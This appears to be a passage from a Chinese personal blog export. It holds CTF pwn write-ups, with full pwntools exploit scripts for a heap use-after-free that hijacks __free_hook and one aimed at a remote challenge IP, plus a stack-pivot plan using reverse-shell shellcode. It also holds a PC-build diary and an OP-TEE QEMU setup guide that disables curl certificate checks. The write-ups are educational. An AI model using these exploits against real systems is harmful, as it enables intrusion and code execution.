←  Chunk(addr=0x55e3384533e0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e3384533c0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e3384533a0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453380, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453360, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55e338453340, size=0x20, flags=PREV_INUSE) \nFastbins[idx=1, size=0x30] 0x00\nFastbins[idx=2, size=0x40] 0x00\nFastbins[idx=3, size=0x50] 0x00\nFastbins[idx=4, size=0x60] 0x00\nFastbins[idx=5, size=0x70] 0x00\nFastbins[idx=6, size=0x80] 0x00\n─────────────────── Unsorted Bin for arena '*0x7fd435ee1c40' ───────────────────\n[+] Found 0 chunks in unsorted bin.\n──────────────────── Small Bins for arena '*0x7fd435ee1c40' ────────────────────\n[+] Found 0 chunks in 0 small non-empty bins.\n──────────────────── Large Bins for arena '*0x7fd435ee1c40' ────────────────────\n[+] Found 0 chunks in 0 large non-empty bins.\n```\n\n利用上述思路，泄露main_arena地址进而获得libc基址的代码如下：\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nmyproc = process(['./pwn'],env={\"LD_PRELOAD\":\"./libc.so.6\"})\nmylibc = ELF('./libc.so.6')\n\ndef add(index,size):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n    myproc.recvuntil(\"input size\")\n    myproc.sendline(str(size))\n\ndef delete(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n\ndef edit(index,content):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n    myproc.recvuntil(\"input content\")\n    myproc.sendline(content)\n\ndef show(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n\ndef leaveyourname(name):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(5))\n    myproc.recvuntil(\"your name:\")\n    myproc.send(name)\n\ndef showyourname():\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(6))\n\nfor i in range(16):\n    add(i,0x10)\n\nfor i in range(10):\n    delete(i)\n\n# 第10个chunk不delete，保证合并时有fastbin能合并到unsortedbin或者smallbin中\nfor i in range(11,16,1):\n    delete(i)\n\ngdb.attach(myproc)\n\n# 触发堆合并\nname = 'aaaa'\nleaveyourname(name)\n\n# 泄露smallbin中的main_arena地址\nshow(7)\nmyproc.recvline()\nsmall_bin_c = myproc.recv(6)\n\n# 通过调试时看到的地址差，算出libc基址\nlibc_base = u64(small_bin_c.ljust(8,'\\x00')) -0x3ebcf0\n\nmyproc.interactive()\n```\n\n## UAF\n\n上述11~15 fastbin chunk跟top chunk合并后分配给了leaveyouname中的name=malloc(0x400)。\n\n此时name指向11~15，add函数中的pools[11]~pools[15]也指向该处（delete函数中free pools[]后未将其置NULL）。\n\n所以可以借助name的输入布置chunk，再通过pools[]数组操作。\n\n```python\nfor i in range(16):\n    add(i,0x10)\n\nfor i in range(10):\n    delete(i)\n\nfor i in range(11,16,1):\n    delete(i)\n\ngdb_text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(myproc.pid)).readlines()[1], 16)\nlog.warn(\"base is 0x%x\" % gdb_text_base)\nbss_addr = gdb_text_base + 0x202020\n\nname = 'a'*8 + 'b'*8 + 'c'*8 + '\\x61' + '\\x00'*7\nname += '\\x00'*24 + '\\x31' + '\\x00'*7\nleaveyourname(name)\n# gdb.attach(myproc)\n\ndelete(12)\ndelete(13)  # 执行完这两个delete后，fastbin中会出现一个0x60和一个0x30的free chunk。这两个chunk实际时重叠的，0x60的chunk包含0x30的chunk。所以后面通过改0x60这个chunk的内容可以改0x30这个chunk的fd\n\nadd(0,0x50)  # 会将fastbin上0x60那个chunk分配出来\npayload1 = '\\x00'*16 + '\\x31' + '\\x00'*7 + p64(bss_addr)\nedit(0,payload1)  # 将bss_addr写入0x30这个chunk的fd\nadd(1,0x20)  # 申请0x20大小的堆块，会将fastbin上0x30的chunk分配出来。由于上一步改了fd（bss_addr），所以下一次再申请同样大小的chunk时，会从bss_addr处开始分配\nadd(2,0x20)  # 这次add，分配的是bss_addr处。因此，后面对这个chunk的操作会复写bss段。通过更改payload1中的地址，可以实现任意地址写任意值\nedit(2,p64(0xdeadbeef))\n```\n\n执行完leaveyouname后的堆空间：\n\n```\ngef➤  heap chunks\nChunk(addr=0x55a8beee9010, size=0x250, flags=PREV_INUSE)\n    [0x000055a8beee9010     07 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]\nChunk(addr=0x55a8beee9260, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee9260     00 00 00 00 00 00 00 00 10 90 ee be a8 55 00 00    .............U..]\nChunk(addr=0x55a8beee9280, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee9280     60 92 ee be a8 55 00 00 10 90 ee be a8 55 00 00    `....U.......U..]\nChunk(addr=0x55a8beee92a0, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee92a0     80 92 ee be a8 55 00 00 10 90 ee be a8 55 00 00    .....U.......U..]\nChunk(addr=0x55a8beee92c0, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee92c0     a0 92 ee be a8 55 00 00 10 90 ee be a8 55 00 00    .....U.......U..]\nChunk(addr=0x55a8beee92e0, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee92e0     c0 92 ee be a8 55 00 00 10 90 ee be a8 55 00 00    .....U.......U..]\nChunk(addr=0x55a8beee9300, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee9300     e0 92 ee be a8 55 00 00 10 90 ee be a8 55 00 00    .....U.......U..]\nChunk(addr=0x55a8beee9320, size=0x20, flags=PREV_INUSE)\n    [0x000055a8beee9320     00 93 ee be a8 55 00 00 10 90 ee be a8 55 00 00    .....U.......U..]\nChunk(addr=0x55a8beee9340, size=0x60, flags=PREV_INUSE)\n    [0x000055a8beee9340     f0 2c 2b 5c d4 7f 00 00 f0 2c 2b 5c d4 7f 00 00    .,+\\.....,+\\....]\nChunk(addr=0x55a8beee93a0, size=0x20, flags=)\n    [0x000055a8beee93a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]\nChunk(addr=0x55a8beee93c0, size=0x410, flags=PREV_INUSE)\n    [0x000055a8beee93c0     61 61 61 61 61 61 61 61 62 62 62 62 62 62 62 62    aaaaaaaabbbbbbbb]\nChunk(addr=0x55a8beee97d0, size=0x20840, flags=PREV_INUSE)  ←  top chunk\ngef➤  x/20gx 0x000055a8beee93c0\n0x55a8beee93c0:\t0x6161616161616161\t0x6262626262626262\t# pools[11]的内容\n0x55a8beee93d0:\t0x6363636363636363\t0x0000000000000061\t# pools[12]的size\n0x55a8beee93e0:\t0x0000000000000000\t0x0000000000000000  # pools[12]的内容\n0x55a8beee93f0:\t0x0000000000000000\t0x0000000000000031\t# pools[13]的size\n0x55a8beee9400:\t0x000055a8beee930a\t0x0000000000000000\t# pools[13]的size\n0x55a8beee9410:\t0x0000000000000000\t0x0000000000020bf1\n0x55a8beee9420:\t0x000055a8beee93f0\t0x0000000000000000\n0x55a8beee9430:\t0x0000000000000000\t0x0000000000020bd1\n0x55a8beee9440:\t0x000055a8beee9410\t0x0000000000000000\n0x55a8beee9450:\t0x0000000000000000\t0x0000000000020bb1\n```\n\n# EXP\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nmyproc = remote(\"52.152.231.198\",8081)\n# myproc = process(['./pwn'],env={\"LD_PRELOAD\":\"./libc.so.6\"})\nmylibc = ELF('./libc.so.6')\n\ndef add(index,size):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n    myproc.recvuntil(\"input size\")\n    myproc.sendline(str(size))\n\ndef delete(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n\ndef edit(index,content):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n    myproc.recvuntil(\"input content\")\n    myproc.sendline(content)\n\ndef show(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"input index\")\n    myproc.sendline(str(index))\n\ndef leaveyourname(name):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(5))\n    myproc.recvuntil(\"your name:\")\n    myproc.send(name)\n\ndef showyourname():\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(6))\n\nfor i in range(16):\n    add(i,0x10)\n\nfor i in range(10):\n    delete(i)\n\nfor i in range(11,16,1):\n    delete(i)\n\n# gdb.attach(myproc)\n\nname = 'a'*8 + 'b'*8 + 'c'*8 + '\\x61' + '\\x00'*7\nname += '\\x00'*24 + '\\x31' + '\\x00'*7\nleaveyourname(name)\n\nshow(7)\nmyproc.recvline()\nsmall_bin_c = myproc.recv(6)\n\nlibc_base = u64(small_bin_c.ljust(8,'\\x00')) -0x3ebcf0\n\n\nfree_hook = mylibc.symbols['__free_hook'] + libc_base\nlog.warn(\"free hook 0x%x\" % free_hook)\n\n# exec_addr = 0xdeadbeef\nexec_addr = libc_base + 0x4f432\ndelete(12)\ndelete(13)\n\nadd(0,0x50)\npayload1 = '\\x00'*16 + '\\x31' + '\\x00'*7 + p64(free_hook - 0x8)\nedit(0,payload1)\nadd(1,0x20)\nadd(2,0x20)\nedit(2,p64(exec_addr))\nlog.warn(\"small bin : 0x%x\" % u64(small_bin_c.ljust(8,'\\x00')))\nlog.success(\"libc base : 0x%x\" % libc_base)\nlog.warn(\"free hook 0x%x\" % free_hook)\n\ndelete(9)\n\nmyproc.interactive()\n\n```","categories":["CTF"]},{"title":"从零开始组装台式机","url":"/2020/12/20/myfirstpc/","content":"\n> 现在的笔记本已经用了4年了，上半年加了一块8g的内存条，现在用着性能也还不错。但是最近想开始学习渗透和web，需要搭建各种虚拟机环境，有时需要同时跑5、6台虚拟机，笔记本确实受不住。所以，出于性价比和探索精神的考虑，决定尝试自己组装一台windows台式机。感觉有点酷酷的O(∩_∩)O\n\n在开始组装电脑之前，做了一点小功课，其实就是看知乎上别人推荐的各种组件。主要参考了如下两篇文章：\n\n- [买台式电脑 6000～7000是直接买品牌机 还是自己组装 性价比高?](https://www.zhihu.com/question/402052824/answer/1340237376)\n- [7000元intel十代酷睿i7 10700F电脑配置方案](https://zhuanlan.zhihu.com/p/315480353)\n\n后面这篇文章的作者还写了很多帖子，分别介绍了不同价位的组装机搭配。不一定要完全按照他们推荐的组件进行配置，但能提供一个相对完整的方案给我们这种小白做参考，真的是非常好的。\n\n想要组装一台主机，首先需要知道主机由哪些组件构成，我的理解如下：\n\n- 1、CPU：这是一台主机的核心，计算能力都靠它了。x86架构的有intel和amd两家厂商可选。\n- 2、主板：主板上的电路非常丰富，负责连接各个组件，非常重要。\n- 3、散热器：顾名思义用来散热的，这里指给cpu散热的散热器。\n- 4、内存条：主机的主要组成之一。\n- 5、硬盘：分为SSD和普通机械硬盘，前者速度快很多。\n- 6、显卡：若CPU不带集显，则必须在主板外接一个显卡，不然无法显示。CPU带集显的情况下也可以自己装个更好的显卡，玩游戏时会有更好的视觉体验。\n- 7、电源：电源分很多种，550W，600W，650W，750W等等，根据实际需要进行选择，我是按照参考文章配的电源。\n- 8、机箱：用来固定主板，将电源等装在一起，方便后续使用。\n- 9、外设：需要**鼠标**、**键盘**、**显示器**这些基本的输入输出设备，不然没法跟主机交互哦。\n\n# 第一步，买配件\n\n下面介绍一下我组装电脑的配置吧！不包括显卡、显示器、键盘鼠标这些，一共花了6k左右。这个价格和这个配置的性价比，作为电脑组装入门我觉得是很可以的。\n\n## 1、CPU\n\n[intel i7-10700F 8核16线程](https://item.jd.com/100013163656.html)\n\ni7的cpu不算新，但是也够用吧。这款有三种类型：\n\n- 10700：带集显的cpu\n- 10700F：不带集显的cpu\n- 10700FK：不带集显且可超频的cpu\n\n我对超频没需求，想自己配显卡，所以选了中间这个10700F型号。\n\n## 2、主板\n\n[微星（MSI）MAG B460M MORTAR WIFI迫击炮电脑主板](https://item.jd.com/100013654784.html)\n\n主板我留意了技嘉和微星两家的，两家都还不错。因为第一次配机器，怕后面装好后有兼容性等问题，就选了帖子推荐的微星这款。\n\n## 3、散热器\n\n[超频三（PCCOOLER）东海X6 CPU散热器](https://item.jd.com/3311611.html)\n\n散热器分为风冷和水冷两种。水冷是新产品，据说很酷炫很烧钱，所以我就选了保守派风冷。目前觉得也挺好用的。\n\n## 4、内存条\n\n[美商海盗船(USCORSAIR)DDR4 3000 32GB(16G×2)套装 台式机内存条 复仇者LPX系列 游戏型](https://item.jd.com/1990572.html#crumb-wrap)\n\n内存条可以根据自己实际需要来选，我觉得是越大越好。公司大部分电脑都是32g的，之前我的笔记本是16g，感觉32g对于目前大部分工作来说是完全够用了的。\n\n内存条的厂商有金士顿，海盗船等等。我选了海盗船16g*2的，为什么不直接买32g呢？因为主板有4个内存条插槽，据说1和3，2和4各自组合起来用效率是最高的，所以买两条充分发挥一下主板的作用。\n\n## 5、硬盘\n\n[西部数据（Western Digital）1TB SSD固态硬盘 M.2接口(NVMe协议) WD_BLACK SN750](https://item.jd.com/100002206075.html#crumb-wrap)\n\n硬盘有固态硬盘和机械硬盘之分，考虑速度问题，我买了一块1T的固态硬盘，没有买机械硬盘。如果后面固态硬盘不够用了再考虑从买机械硬盘。\n\n硬盘比较有名的厂商是西部数据，三星，东芝，联想等等，可以挑自己喜欢的。据说西部数据这个黑盘很好，所以我就买来试试。\n\n## 6、显卡\n\n[华硕 （ASUS）电竞特工TUF-GeForce RTX 2060-O6G-GAMING 14000MHz 1365-1740MHz游戏显卡6G](https://item.jd.com/100003292738.html)\n\n本来是想买上面这张显卡的，但是没抢到。今年好像显卡特别抢手？看了几篇帖子是这么说的，说不推荐现在买显卡。\n\n由于我买的CPU是不带集显的，所以暂时买了个几百块的便宜显卡过渡一下。\n\n## 7、电源\n\n[安钛克(Antec)VP550铜牌 台式机电脑主机机箱电源铜牌550W](https://item.jd.com/7254027.html)\n\n电源其实我也不太会选。如果CPU、显卡等组件性能越高功率很大的话，就需要买大功率的电源才能发挥它们的最高性能。我这个算是一般般的配置吧，就按照知乎帖子上推荐的买了550W的。\n\n## 8、机箱\n\n[先马（SAMA）坦克3 电脑主机箱 支持ATX主板](https://item.jd.com/100003124872.html)\n\n我买的这个机箱太大了。。。但是又懒得退货了，想着反正一直放在家里就随它吧。如果主板不是很大，也没有很多机械硬盘或固态硬盘需要空间的话，建议女孩子买个小机箱就可以了/(ㄒoㄒ)/~~\n\n## 9、外设\n\n外设就是键盘鼠标显示器这些，可以根据个人喜好去买，我就不推荐啦。\n\n# 第二步，组装\n\n说实话，当我把所有组件拆开后，准备开始组装的时候，我后悔了。为什么要给自己找这么大的麻烦/(ㄒoㄒ)/~~\n\n本来以为就像搭积木一样，拼一拼就可以了。\n\n最困难的部分是散热器的安装，幸好在bilibili上找到一个很详细的组装教程，真的是救命教程——[【装机教程】这可能是你能在网上找到最详细的装机教程](https://www.bilibili.com/video/BV1jE411e7hw?t=1605)。为了表示我的感谢，第一次在b站上贡献出了2个币，哈哈哈。\n\n装机完成后客厅已经被我折磨成这样了。\n\n![](messmess.jpg)\n\n# 第三步，装系统\n\n下面这个视频里讲的很清楚，我就不做重复工作了。 在另一台win10电脑上访问官网，下载官方工具制作U盘启动盘。\n\n[【装机教程】超详细WIN10系统安装教程，官方ISO直装与PE两种方法教程，UEFI+GUID分区与Legacy+MBR分区](https://www.bilibili.com/video/av77344372)\n\n# 第四步，装驱动\n\n这也是很重要的一步，主板、显卡、外设等为了发挥最好的作用，需要更新他们的驱动。方法就是访问对应的官网，找到型号，下载安装就可以了。具体可以参考下面这个视频。\n\n[【装机教程】驱动程序是什么东西？为什么要安装驱动程序？如何正确官方的安装纯净版驱动？](https://www.bilibili.com/video/av84597019?spm_id_from=333.788.b_636f6d6d656e74.7)","categories":["Others"]},{"title":"基于 qemu 的 optee 模拟环境搭建","url":"/2020/12/20/qemuv8-optee/","content":"\n很早之前，参考CSDN博主“漂流的猴子”的两篇博客[0.使用Qemu运行OP-TEE](https://icyshuai.blog.csdn.net/article/details/71499619)和[OP-TEE_3.6.0的qemu运行验证](https://icyshuai.blog.csdn.net/article/details/99855105)，尝试搭建过optee的模拟执行环境，但无论是在家里还是在公司里，都因为网络或其他莫名的原因而没有成功。\n\n这次，误打误撞看到了optee官方文档中的搭建方法——[Build and run](https://optee.readthedocs.io/en/latest/building/index.html)，抱着尝试的心态，竟然搭建成功了！所以做个记录。\n\n我用到的环境如下：\n\n- windows 10上安装的virtualbox 6.1.6版本。这个版本应该无所谓。\n\n- 虚拟机的系统是Ubuntu 18.04。\n- 安装的optee版本是3.8.0。\n\n这里要提两个点，一开始我用的是Ubuntu 16.04版本安装optee 3.6.0，但是在安装依赖的时候一直报下面这个错，所以我就换成了Ubuntu 18.04。\n\n```shell\nE: Unable to locate package python3-pycryptodome\n```\n\n在Ubuntu 18.04上repo init的时候又报了一个错（具体是啥忘记了），原因是repo版本和optee版本不兼容。要么降低repo的版本（从2.x到1.x），要么使用新版本的optee。我选择了后者，使用Ubuntu 18.04，repo 2.x版本安装optee的3.8.0版本，最终环境搭建成功。\n\n# 1 安装依赖\n\n（1）因为安装的是64位的ubuntu，所以先使能系统对i386的支持。\n\n```shell\n$ sudo dpkg --add-architecture i386\n$ sudo apt-get update\n```\n\n（2）安装所有需要用到的packages。\n\n```shell\n$ sudo apt-get install android-tools-adb android-tools-fastboot autoconf \\\n        automake bc bison build-essential ccache cscope curl device-tree-compiler \\\n        expect flex ftp-upload gdisk iasl libattr1-dev libcap-dev \\\n        libfdt-dev libftdi-dev libglib2.0-dev libhidapi-dev libncurses5-dev \\\n        libpixman-1-dev libssl-dev libtool make \\\n        mtools netcat python-crypto python3-crypto python-pyelftools \\\n        python3-pycryptodome python3-pyelftools python-serial python3-serial \\\n        rsync unzip uuid-dev xdg-utils xterm xz-utils zlib1g-dev\n```\n\n# 2 安装android repo\n\n如果系统之前没有android的开发环境，没有安装过repo的话，可以将repo下载到本地，然后添加到环境变量中。\n\n```shell\n$ mkdir ~/bin\n$ vim ~/.bashrc\n\texport PATH=~/bin:$PATH\n$ source ~/.bashrc\n$ curl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repo\n$ chmod a+x ~/bin/repo\n```\n\n# 3 获取源码\n\n通过github上op-tee项目中的manifest指定版本来获取所需的源码，这种方法对于新手来说快捷省事。（repo之前需要设置好git的代理，保证能通过git访问外网）\n\n```shell\n$ mkdir -p optee\n$ cd optee\n$ repo init -u https://github.com/OP-TEE/manifest.git -m qemu_v8.xml -b 3.8.0\n$ repo sync -j4 --no-clone-bundle\n```\n\n以上命令执行完如果没有任何问题的话，就可以直接跳到第4步去下载toolchain了。\n\n但是很不幸，我在`sync`的时候遇到了这个错误——`“GnuTLS recv error (-110): The TLS connection was non-properly terminated”`，最后成功的[解决办法](https://stackoverflow.com/questions/52529639/gnutls-recv-error-110-the-tls-connection-was-non-properly-terminated)是重装git，步骤如下。\n\n```shell\n$ sudo apt-get install build-essential fakeroot dpkg-dev -y\n$ sudo apt-get build-dep git -y\n$ sudo apt-get install libcurl4-openssl-dev -y\n$ cd ~\n$ mkdir source-git\n$ cd source-git/\n$ apt-get source git\n$ cd git-2.*.*/\n$ sed -i -- 's/libcurl4-gnutls-dev/libcurl4-openssl-dev/' ./debian/control\n$ sed -i -- '/TEST\\s*=\\s*test/d' ./debian/rules\n$ dpkg-buildpackage -rfakeroot -b -uc -us\n$ sudo dpkg -i ../git_*ubuntu*.deb\n```\n\n# 4 下载toolchains\n\n编译不同架构的op-tee时，需要用到不同的toolchain，因此我们需要事先下载好。\n\n```shell\n$ cd ~/optee/build\n$ make -j2 toolchains\n```\n\n如果以上命令执行没有问题的话，继续去第5步就好啦。\n\n我这里遇到一个问题：\n\n- make报错，提示在指定的目录中没有tar包。\n\n  我仔细研究了一下，发现是没有下载下来。于是打开build目录下的toolchain.mk看了看这个脚本的实现。脚本第25行是`curl -s -L $(2) -o $(TOOLCHAIN_ROOT)/$(3).tar.xz;`，目的是下载一个tar包。去掉`-s`看看下载时到底发生了什么。果不其然，有错误提示`curl: (60) SSL certificate problem: unable to get local issuer certificate`。这是证书的问题，有两种方案：一种是在本地安装证书，另一种是curl下载时加上`-k`参数跳过证书检查。我选择第二种，因此将toolchain.mk中的第25行改成`curl -k -L $(2) -o $(TOOLCHAIN_ROOT)/$(3).tar.xz;`，然后就可以成功下载toolchain啦。\n\n# 5 编译整个工程\n\n因为在一开始已经设置过repo manifests了，所以编译的时候可以不指定版本，直接运行make。\n\n```shell\n$ cd ~/optee/build\n$ make -j4\n# 或者，将编译输出重定向到log中，方便编译出问题了定位\n$ make 2>&1 | tee build.log\n```\n\n# 6 运行optee\n\n在build目录下执行make run\n\n```shell\n$ cd ~/optee/build\n$ make run\n```\n\n执行完后，一共会有三个窗口：qemu，非安全世界，安全世界。前两个窗口有shell，安全世界的窗口只有日志输出。\n\n在qemu窗口中执行`c`，然后就可以在非安全世界的shell中执行`xtest`进行测试。\n\n```\nQEMU console:         (qemu) c\nNormal world shell:   # xtest\n```\n\n到此，整个基于qemu的optee环境就算搭建完成了，后续可以自由地进行分析和验证。\n\n# 7 optee代码目录结构\n\n一开始不明白为什么manifest下的default.xml和qemu_v8.xml两者代码目录不一样，最明显的，前者有uboot而后者没有，那后者是用什么引导启动的呢？\n\n其实，default.xml编译的是32位的optee，而qemu_v8.xml编译的是64位的。64位的optee使用UEFI-EDK2替换掉了uboot，并引入加密组件mbedtls。这里参考了[OPEN-TEE代码目录结构及编译目标](https://www.xiezeyang.com/2020/08/16/Security/OPEN-TEE%E4%BB%A3%E7%A0%81%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E5%8F%8A%E7%BC%96%E8%AF%91%E7%9B%AE%E6%A0%87/)这篇文章才弄懂的。\n\n以qemu_v8.xml中的代码目录为例，如下是编译完成后的状态，out和out-br是编译过程中创建的目录。\n\n```\nbuild/ - 不同平台的makefile及kconfig\nbuildroot/ - 一款编译工具\nedk2/ - 遵循UEFI标准的bootloader源码\nlinux/ - linux kernel源码\nmbedtls/ - 开源的ssl/tls加密组件，轻量级\noptee_benchmark/ - open-tee项目基准框架的源码\noptee_client/ - open-tee项目的非安全侧源码\noptee_examples/ - open-tee中使用的示例CA和TA源码\noptee_os/ - open-tee项目的os源码\noptee_test/ - 测试套件xtest源码\nout/ - 存储编译生成用于烧录的image，如bl1.bin, bl2.bin等\nout-br/ - 存放buildroot工具编译生成的文件\nqemu/ - qemu源码\n.repo/ - repo工程\nsoc_term/ - 监听qemu、非安全终端、安全终端三个端口，正确将log重定向至对应的终端\ntoolchains/ - 包含编译所需的工具链\ntrusted-firmware-a/ - atf源码\n```\n\n# 8 后续研究\n\n后面计划参考《手机安全和可信应用开发指南》及[OP-TEE documentation](https://optee.readthedocs.io/en/latest/general/index.html)对各个模块更深入地分析。\n\n另一个任务是分析一些[op-tee历年漏洞](https://www.op-tee.org/security-advisories/)。","categories":["OP-TEE"]},{"title":"hitctf 2020 之 dagongren1","url":"/2020/12/05/hitctf2020-dagongren1/","content":"\n> 这是第一次在比赛的时候把题目给做出来了嘻嘻嘻。感谢王老师，为了让我把这题做完还请我吃烧烤，此处必须给王老师发一张超级Super无敌好人卡！[狗头...]\n\n# 1 漏洞点\n\n题目下载：[dagongren1](dagongren1)\n\n首先看一下程序的基本情况。\n\n```shell\nbling@bling:~/Desktop$ file dagongren1 \ndagongren1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e5adcd14da3eedce7b1b4c36d62d68bd687e63bc, not stripped\nbling@bling:~/Desktop$ checksec dagongren1 \n[*] '/home/bling/Desktop/dagongren1'\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x400000)\n    RWX:      Has RWX segments\n```\n\nx86架构下的64位程序，栈cookie、NX、PIE都没开，还有可读可写可执行的段，看起来这个题利用时没什么障碍。运行一下程序，然后看看IDA反汇编的源码，分析一下漏洞点。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char v4[32]; // [rsp+0h] [rbp-20h] BYREF\n\n  puts(\"Good morning master\");\n  puts(aWorkHardForYou);\n  puts(\"Come On\");\n  _isoc99_scanf(\"%s\", v4);\n  fclose(stdout);\n  fclose(stderr);\n  return 0;\n}\n```\n\n可以看到scanf时有个栈溢出，溢出可以覆盖main函数返回地址，那么这就控制了eip。\n\n# 2 利用\n\n这个题控制eip很简单，但是怎么get shell呢？\n\n```\n1、到这里，我首先想到的是之前ctfwiki里的stack pivoting方法。想把shellcode布置在栈上，然后直接jmp rsp。但是无奈使用ROPgadget并没有找到“jmp rsp”这条指令，其他的看了看想了想也都不可行。所以只能放弃了。\nbling@bling:~/Desktop$ ROPgadget --binary dagongren1 --only \"jmp|ret\"\nGadgets information\n============================================================\n0x00000000004006bb : jmp 0x400650\n0x0000000000400803 : jmp 0x40087a\n0x000000000040098b : jmp qword ptr [rbp]\n0x000000000040094b : jmp qword ptr [rcx]\n0x0000000000400635 : jmp rax\n0x0000000000400581 : ret\n\n2、然后，我又想通过泄露libc来执行system或execve，但是由于源码中有“fclose(stdout);”，使得程序的标准输出被关了，于是我不可能泄露出libc。最后也只能放弃该想法。\n```\n\n最后，在王老师的提示下，知道.bss段末尾在进程空间中有一段是可写的（要写到extern后面哦），加上该题程序未开启NX，因此这段还可以执行。所以就依靠ROP+栈迁移吧！\n\n## 2.1 迁移rbp\n\n迁移到哪里呢？一开始试了下迁移到0x600cf0，但是scanf的时候会在0x0c处截断，试了半天最后选择了0x600f0f。\n\nmain函数结尾处:\n\n```assembly\n.text:0000000000400735                 leave\n.text:0000000000400736                 retn\n```\n\n相当于：\n\n```assembly\nmov esp,ebp\npop ebp\npop rip\n```\n\n因此我们将rbp覆盖为栈迁移目的地址，将rip覆盖为我们想执行的代码。\n\n## 2.2 在新栈中布置shellcode\n\nrbp栈迁移后，我们需要在新的栈空间布置shellcode，因此必定还需要进行依次输入。查看main函数中scanf的上下文，如下：\n\n```assembly\n.text:00000000004006FC                 lea     rax, [rbp+var_20]\n.text:0000000000400700                 mov     rsi, rax\n.text:0000000000400703                 mov     edi, offset aS  ; \"%s\"\n.text:0000000000400708                 mov     eax, 0\n.text:000000000040070D                 call    __isoc99_scanf\n```\n\n0x4006fc处是以rbp进行栈空间寻址的，因此在我们迁移完rbp后就可以立马进行下一次scanf输入了。构造过程如下图所示：\n\n```\n         栈空间\n\n         +---------------+\n         |               |\n         |               |                       .bss段\n         +---------------+\n         |               |                       +---------------+\n         +---------------+                       |               |\nret_addr |   0x4006fc    |                       |               |\n         +---------------+                       |               |\nold_rbp  |   0x600f0f    +----------+            |               |\n         +---------------+ v4+0x20  |            |               |\n         |               |          |            |               |\n         |               |          |            |               |\n         |               |          |            |               |\n         |               |          |            |               |\n         |    padding    |          |            |               |\n         |               |          |            |               |\n         |               |          |            |               |\n         |               |          |            +---------------+\n         |               |          |            |               |\n         |               |          +----------> +---------------+ 0x600f0f\n         |               |                       |               |\n         +---------------+                       |               |\n         |               |                       |               |\n         +---------------+ v4                    +---------------+\n\n```\n\n## 2.3 控制eip执行shellcode\n\n上一步骤中，scanf输入完毕后，main函数会继续执行到最后的`leave;ret;`，这里可以再次控制eip。需要提前布置好新栈中的数据。\n\n因为是同一个main函数的栈，所以新栈的结构跟之前栈结构是一样的。这里需要将ret_addr处的地址改成shellcode的地址，这样main函数中执行到ret的时候就可以控制执行流了。\n\n```\n         栈空间\n\n         +---------------+\n         |               |\n         |               |                       .bss段\n         +---------------+\n         |               |                       +---------------+\n         +---------------+                       |               |\nret_addr |   0x4006fc    |                       |               |\n         +---------------+                       |               |\nold_rbp  |   0x600f0f    +----------+            |               |\n         +---------------+ v4+0x20  |            |   shellcode   |\n         |               |          |            |               |\n         |               |          |            |               |\n         |               |          |            +---------------+\n         |               |          |   ret_addr |     addr      |\n         |    padding    |          |            +---------------+\n         |               |          |   old_rbp  |    padding    |\n         |               |          +----------> +---------------+ 0x600f0f\n         |               |                       |               |\n         |               |                       |               |\n         |               |                       |    padding    |\n         |               |                       |               |\n         +---------------+                       |               |\n         |               |                       |               |\n         +---------------+ v4                    +---------------+ 0x600f0f-0x20\n```\n\n## 2.4 shellcode的选择\n\nshellcode有一个官方网站：[shell-storm](http://shell-storm.org/shellcode/)\n\n由于程序源码中有“fclose(stdout);”的限制，无法通过普通shellcode拿到shell。这大概是这道题对我来说最难的一部分了。对网络真的一窍不通o(╥﹏╥)o\n\n为了绕过这一限制，最后使用了[Reverse TCP shell](http://shell-storm.org/shellcode/files/shellcode-857.php)这个shellcode，“反连TCP”的方法。\n\n参考这篇文章大概了解了一下“反连TCP”这是个啥：[metasploit中Payload的reverse_tcp和bind_tcp的区别](https://blog.csdn.net/adidala/article/details/24117711)。\n\n大概意思就是 